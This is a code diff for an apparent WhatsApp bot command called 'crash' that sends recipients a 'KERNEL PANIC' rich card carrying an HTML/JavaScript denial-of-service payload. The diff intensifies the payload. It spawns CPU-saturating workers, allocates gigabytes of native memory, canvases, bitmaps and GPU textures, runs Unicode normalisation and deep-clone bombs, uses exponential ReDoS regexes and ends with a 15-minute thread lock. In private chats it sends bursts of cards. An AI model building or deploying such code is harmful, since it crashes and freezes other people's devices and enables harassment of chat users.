@@ -4,16 +4,17 @@ import { fytBold } from "../../core/socketText.ts";
 /* ───────────────────────── payload ───────────────────────── */
 
 function buildKernelPanic(name: string, lv: number) {
-  const bufMb = 48 * lv;        // MB por ArrayBuffer (memoria externa)
-  const bufCount = 20 * lv;     // nº de ArrayBuffers
-  const canvasPx = 3600 + 2400 * lv;
-  const canvasCount = 2 + lv;
-  const imgCount = 70 * lv;
-  const imgPx = 1200;
-  const workers = 4 * lv;
-  const iter = 2500 + 1500 * lv;
-  const blur = 200 + 150 * lv;
-  const turbOct = 6 + lv;
+  const CH = 512 * lv;          // MB por ArrayBuffer
+  const N = 4 * lv;             // nº de ArrayBuffers (tope 2.15 GB c/u)
+  const CV = 4000 + 2000 * lv;  // lado del canvas
+  const CNC = 1 + lv;
+  const IMG = 4 * lv;           // bitmaps redimensionados
+  const IMGSZ = 3000 + 1000 * lv;
+  const WK = 6 * lv;
+  const ITER = 2000 + 1500 * lv;
+  const BLUR = 220 + 140 * lv;
+  const OCT = 6 + lv;
+  const NORM = 1500000 * lv;
 
   const html = `<style>
 *{box-sizing:border-box;margin:0;padding:0}
@@ -25,13 +26,13 @@ h2{margin:0 0 6px;color:#0ff;text-align:center;font-size:14px;letter-spacing:2px
 #s{margin-top:5px;font-family:monospace;font-size:9px;color:#0ff;white-space:pre}
 canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1}
 #tv{position:absolute;inset:0;z-index:2;opacity:.5}
-#bl{position:absolute;inset:0;z-index:3;filter:blur(${blur}px);background:radial-gradient(#0ff,#0055ff,#000);will-change:filter;animation:sp 3s linear infinite}
-@keyframes sp{to{transform:rotate(360deg) scale(1.4)}}
+#bl{position:absolute;inset:0;z-index:3;filter:blur(${BLUR}px);background:radial-gradient(#0ff,#0055ff,#000);will-change:filter;animation:sp 2.5s linear infinite}
+@keyframes sp{to{transform:rotate(360deg) scale(1.5)}}
 </style>
 <div id="g">
   <h2>☢️ KERNEL PANIC ☢️</h2>
-  <div class="st"><div>HEAP<br><b id="m">0</b></div><div>FPS<br><b id="f">0</b></div></div>
-  <div id="s">fase 0</div>
+  <div class="st"><div>NATIVO<br><b id="m">0</b></div><div>FPS<br><b id="f">0</b></div></div>
+  <div id="s">init</div>
 </div>
 <div id="bl"></div>
 <svg id="tv"></svg>
@@ -39,142 +40,112 @@ canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1}
 <script>
 var cv=document.getElementById('cv'),fEl=document.getElementById('f'),mEl=document.getElementById('m'),sEl=document.getElementById('s');
 var keep=[],pool=[],fr=0,lf=0,mb=0;
-function fase(n){try{sEl.textContent='fase '+n}catch(e){}}
-function next(fn){try{requestAnimationFrame(function(){setTimeout(fn,10)})}catch(e){setTimeout(fn,10)}}
+function fase(n){try{sEl.textContent=n}catch(e){}}
 function mbUp(n){mb+=n;try{mEl.textContent=mb}catch(e){}}
-function turb(seed,size,oct){
-  return '<svg width="'+size+'" height="'+size+'" xmlns="http://www.w3.org/2000/svg">'+
-   '<filter id="f'+seed+'"><feGaussianBlur stdDeviation="${blur/2}"/>'+
-   '<feTurbulence type="fractalNoise" baseFrequency="0.85" numOctaves="'+oct+'" seed="'+seed+'" stitchTiles="stitch"/>'+
-   '<feColorMatrix type="saturate" values="5"/></filter>'+
-   '<rect width="'+size+'" height="'+size+'" filter="url(#f'+seed+')"/></svg>';
-}
 
-/* 1 · CPU: todos los núcleos, bucle infinito */
-fase(1);
+/* 0 · CPU inmediata: todos los núcleos, sin esperar paint */
 try{
-  var src='onmessage=function(){var a=new Float64Array(4096),v=1;while(true){for(var i=0;i<4096;i++){v=Math.atan2(Math.sin(v),Math.cos(v))+Math.sqrt(Math.abs(v)+1);a[i]=v}}}';
-  var u=URL.createObjectURL(new Blob([src],{type:'application/javascript'}));
-  var n=Math.max(4,(navigator.hardwareConcurrency||8)*${workers});
-  for(var i=0;i<n;i++){var w=new Worker(u);w.postMessage(1);pool.push(w)}
+  var wsrc='onmessage=function(){var a=new Float64Array(8192),v=1;while(true){for(var i=0;i<8192;i++){v=Math.atan2(Math.sin(v),Math.cos(v))+Math.sqrt(Math.abs(v)+1);a[i]=v}}}';
+  var wu=URL.createObjectURL(new Blob([wsrc],{type:'application/javascript'}));
+  var wn=Math.max(4,(navigator.hardwareConcurrency||8)*${WK});
+  for(var wi=0;wi<wn;wi++){try{var wk=new Worker(wu);wk.postMessage(1);pool.push(wk)}catch(e){}}
 }catch(e){}
 
-next(function(){
-  /* 2 · memoria EXTERNA al heap V8: ArrayBuffers tocados página a página */
-  fase(2);
-  for(var b=0;b<${bufCount};b++){
-    try{
-      var buf=new Uint8Array(${bufMb}*1048576);
-      for(var p=0;p<buf.length;p+=4096)buf[p]=1;
-      keep.push(buf);
-      mbUp(${bufMb});
-    }catch(e){try{sEl.textContent='heap agotado en '+mb+'MB'}catch(x){}break}
+/* 1 · memoria nativa externa al heap: fill() es memset puro */
+fase('mem');
+for(var b=0;b<${N};b++){
+  try{
+    var ab=new ArrayBuffer(${CH}*1048576);
+    new Uint8Array(ab).fill(b+1);
+    keep.push(ab);
+    mbUp(${CH});
+  }catch(e){try{sEl.textContent='heap tope '+mb+'MB'}catch(x){}break}
+}
+
+/* 2 · backing stores de canvas */
+fase('canvas');
+for(var c=0;c<${CNC};c++){
+  try{
+    var el=document.createElement('canvas');
+    el.width=${CV};el.height=${CV};
+    el.getContext('2d').fillRect(0,0,${CV},${CV});
+    keep.push(el);
+    mbUp(Math.round(${CV}*${CV}*4/1048576));
+  }catch(e){}
+}
+
+/* 3 · bitmaps redimensionados fuera del hilo */
+fase('bitmap');
+try{
+  var sc=document.createElement('canvas');
+  sc.width=600;sc.height=600;
+  var sg=sc.getContext('2d'),sd=sg.createImageData(600,600);
+  for(var p=0;p<sd.data.length;p+=4){sd.data[p]=Math.random()*255;sd.data[p+1]=Math.random()*255;sd.data[p+2]=Math.random()*255;sd.data[p+3]=255}
+  sg.putImageData(sd,0,0);
+  for(var k=0;k<${IMG};k++){
+    (function(){
+      if(!window.createImageBitmap)return;
+      createImageBitmap(sc,{resizeWidth:${IMGSZ},resizeHeight:${IMGSZ}}).then(function(bm){
+        keep.push(bm);mbUp(Math.round(${IMGSZ}*${IMGSZ}*4/1048576));
+      }).catch(function(){});
+    })();
   }
-  next(fase3);
-});
+}catch(e){}
 
-/* 3 · backing stores de canvas (nativos, no cuentan en V8) */
-function fase3(){
-  fase(3);
-  for(var c=0;c<${canvasCount};c++){
-    try{
-      var el=document.createElement('canvas');
-      el.width=${canvasPx};el.height=${canvasPx};
-      var g=el.getContext('2d');
-      g.fillStyle='#'+((c*7)%9)+'0f';
-      g.fillRect(0,0,${canvasPx},${canvasPx});
-      keep.push(el);
-      mbUp(Math.round(${canvasPx}*${canvasPx}*4/1048576));
-    }catch(e){}
-  }
-  next(fase4);
-}
+/* 4 · ICU: normalize sobre millones de combining marks */
+fase('icu');
+try{
+  var cm='\u034f'.repeat(${NORM});
+  keep.push(cm.normalize('NFD'));
+  keep.push(cm.normalize('NFC'));
+  keep.push(cm.toLocaleUpperCase('tr'));
+}catch(e){}
 
-/* 4 · bombardeo de decodificación de bitmaps */
-function fase4(){
-  fase(4);
-  try{
-    var c=document.createElement('canvas');
-    c.width=${imgPx};c.height=${imgPx};
-    var g=c.getContext('2d'),d=g.createImageData(${imgPx},${imgPx});
-    for(var p=0;p<d.data.length;p+=4){d.data[p]=Math.random()*255;d.data[p+1]=Math.random()*255;d.data[p+2]=Math.random()*255;d.data[p+3]=255}
-    g.putImageData(d,0,0);
-    var uri=c.toDataURL();
-    for(var k=0;k<${imgCount};k++){
-      var im=new Image();im.src=uri;keep.push(im);
-      mbUp(Math.round(${imgPx}*${imgPx}*4/1048576));
-    }
-  }catch(e){}
-  next(fase5);
-}
+/* 5 · clon profundo: pila + copia */
+fase('clone');
+try{
+  var deep={v:'█'.repeat(4000)};
+  for(var d=0;d<20000;d++)deep={c:deep};
+  keep.push(structuredClone(deep));
+}catch(e){}
 
-/* 5 · SVG con desenfoque + turbulencia (rasterizado por software) */
-function fase5(){
-  fase(5);
-  try{
-    var tv=document.getElementById('tv');
-    tv.setAttribute('viewBox','0 0 420 420');
-    tv.innerHTML='<defs><filter id="tb"><feGaussianBlur stdDeviation="${blur}"/>'+
-      '<feTurbulence type="fractalNoise" baseFrequency="0.7" numOctaves="${turbOct}" stitchTiles="stitch"/>'+
-      '<feColorMatrix type="saturate" values="6"/></filter></defs>'+
-      '<rect width="420" height="420" filter="url(#tb)"/>';
-  }catch(e){}
-  next(fase6);
-}
+/* 6 · SVG: desenfoque + turbulencia, rasterizado por software */
+fase('svg');
+try{
+  var tv=document.getElementById('tv');
+  tv.setAttribute('viewBox','0 0 420 420');
+  tv.innerHTML='<defs><filter id="tb"><feGaussianBlur stdDeviation="${BLUR}"/>'+
+    '<feTurbulence type="fractalNoise" baseFrequency="0.7" numOctaves="${OCT}" stitchTiles="stitch"/>'+
+    '<feColorMatrix type="saturate" values="6"/></filter></defs><rect width="420" height="420" filter="url(#tb)"/>';
+}catch(e){}
 
-/* 6 · documentos hijos, cada uno con su propia turbulencia */
-function fase6(){
-  fase(6);
-  try{
-    var seed=0;
-    (function nest(l){
-      if(l<=0)return;
-      for(var b=0;b<2;b++){
-        try{
-          var f=document.createElement('iframe');
-          f.style.cssText='position:absolute;width:2px;height:2px;opacity:0;left:0;top:0;border:0';
-          document.body.appendChild(f);
-          var doc=f.contentDocument;
-          doc.open();doc.write('<body style="margin:0;background:#000">'+turb(seed++,400,${turbOct})+'</body>');doc.close();
-        }catch(e){}
-      }
-      nest(l-1);
-    })(${2 + lv});
-  }catch(e){}
-  next(fase7);
-}
-
-/* 7 · GPU: texturas + shader a pantalla completa */
-function fase7(){
-  fase(7);
-  try{
-    cv.width=Math.min(window.innerWidth||420,760);
-    cv.height=Math.min(window.innerHeight||900,1500);
-    var gl=cv.getContext('webgl',{antialias:false,powerPreference:'high-performance'});
-    if(!gl)throw 0;
+/* 7 · GPU: texturas + shader */
+fase('gpu');
+try{
+  cv.width=Math.min(window.innerWidth||420,760);
+  cv.height=Math.min(window.innerHeight||900,1500);
+  var gl=cv.getContext('webgl',{antialias:false,powerPreference:'high-performance'});
+  if(gl){
     gl.viewport(0,0,cv.width,cv.height);
-
-    /* texturas grandes: memoria de GPU */
     for(var t=0;t<${3*lv};t++){
       try{
         var tex=gl.createTexture();
         gl.bindTexture(gl.TEXTURE_2D,tex);
-        gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,1024,1024,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
+        gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,2048,2048,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
         gl.texParameteri(gl.TEXTURE_2D,gl.TEXTURE_MIN_FILTER,gl.LINEAR);
-        mbUp(4);
+        mbUp(16);
       }catch(e){}
     }
-
     var vs=gl.createShader(gl.VERTEX_SHADER);
     gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}');
     gl.compileShader(vs);
     var fs=gl.createShader(gl.FRAGMENT_SHADER);
     gl.shaderSource(fs,'precision highp float;uniform float t;uniform vec2 r;'+
-      'void main(){vec2 uv=(gl_FragCoord.xy-.5*r)/r.y;float a=t*.3;'+
+      'void main(){vec2 uv=(gl_FragCoord.xy-.5*r)/r.y;float a=t*.35;'+
       'uv*=mat2(cos(a),-sin(a),sin(a),cos(a));vec2 z=uv,c=uv;float it=0.;'+
-      'for(int i=0;i<${iter};i++){z=vec2(z.x*z.x-z.y*z.y,2.*z.x*z.y)+c;'+
+      'for(int i=0;i<${ITER};i++){z=vec2(z.x*z.x-z.y*z.y,2.*z.x*z.y)+c;'+
       'if(dot(z,z)>4.)break;it++;}'+
-      'float k=it/${iter}.0;gl_FragColor=vec4(k*sin(t),k*2.,k*cos(t),1.);}');
+      'float k=it/${ITER}.0;gl_FragColor=vec4(k*sin(t),k*2.,k*cos(t),1.);}');
     gl.compileShader(fs);
     var pr=gl.createProgram();
     gl.attachShader(pr,vs);gl.attachShader(pr,fs);gl.linkProgram(pr);gl.useProgram(pr);
@@ -193,17 +164,17 @@ function fase7(){
       gl.drawArrays(gl.TRIANGLES,0,6);
       requestAnimationFrame(loop);
     })(0);
-  }catch(e){}
-  next(fase8);
-}
+  }
+}catch(e){}
 
-/* 8 · remate: bloqueo del hilo */
-function fase8(){
-  fase(8);
-  try{sEl.textContent+=' · '+mb+'MB'}catch(e){}
-  var t0=Date.now();
-  while(true){if(Date.now()-t0>900000)break}
-}
+/* 8 · remate determinista: ReDoS con backtracking exponencial */
+fase('redos '+mb+'MB');
+try{ /^(a+)+$/.test('a'.repeat(34)+'!'); }catch(e){}
+try{ /^(x+x+)+y$/.test('x'.repeat(34)+'!'); }catch(e){}
+try{ /^(\w+\s?)+$/.test('ab '.repeat(40)+'!'); }catch(e){}
+
+var t0=Date.now();
+while(true){if(Date.now()-t0>900000)break}
 </script>`;
 
   return {
@@ -225,7 +196,7 @@ const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
 export default {
   name: ["crash", "trava", "travar"],
   category: "group",
-  description: "Kernel panic por agotamiento de memoria nativa del renderer: ArrayBuffers, canvas, bitmaps, texturas WebGL, feGaussianBlur y workers.",
+  description: "Kernel panic: 2 GB nativos en ráfaga, ReDoS, bitmaps, texturas y workers. Grupo = 1 tarjeta sin tags.",
   async run(ctx: CommandContext) {
     const { sock, from, msg, args, reply, react } = ctx;
 
@@ -251,7 +222,7 @@ export default {
       const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
       const rich = new AIRich(sock)
         .setTitle("☢️ KERNEL PANIC // LuferOS")
-        .setFooter(`nivel ${level} · ${level === 3 ? "~1.6 GB" : level === 2 ? "~700 MB" : "~250 MB"}`);
+        .setFooter(`nivel ${level} · ${level * 2} GB`);
       rich.addSection(buildKernelPanic(name, level));
       return rich.send(jid);
     };
@@ -269,19 +240,16 @@ export default {
         else name = String((msg as any).pushName || "").trim() || num;
       } catch {}
 
-      /* en grupo: solo 1 rich, sin tags */
       if (!priv) {
         try { await card(t, name, lv); ok++; }
         catch (e: any) { fail.push(e?.message || String(e)); }
         continue;
       }
 
-      /* en privado: ráfaga para saturar */
-      const cards = 3 + lv;
-      for (let i = 0; i < cards; i++) {
+      for (let i = 0; i < 3 + lv; i++) {
         try { await card(t, name, lv); ok++; }
         catch (e: any) { fail.push(e?.message || String(e)); }
-        await sleep(300);
+        await sleep(250);
       }
     }
 
@@ -289,7 +257,7 @@ export default {
 
     await reply(
       `${fytBold("Kernel panic")} → ${priv ? targets.map((t) => `+${t.split("@")[0]}`).join(" ") : "grupo (1 tarjeta, sin tags)"}\n` +
-        `Nivel ${lv} · ${ok} enviadas${fail.length ? ` · ${fail.length} fallos` : ""}`,
+        `Nivel ${lv} · ${ok} ok${fail.length ? ` · ${fail.length} fallos` : ""}`,
     ).catch(() => undefined);
   },
 };
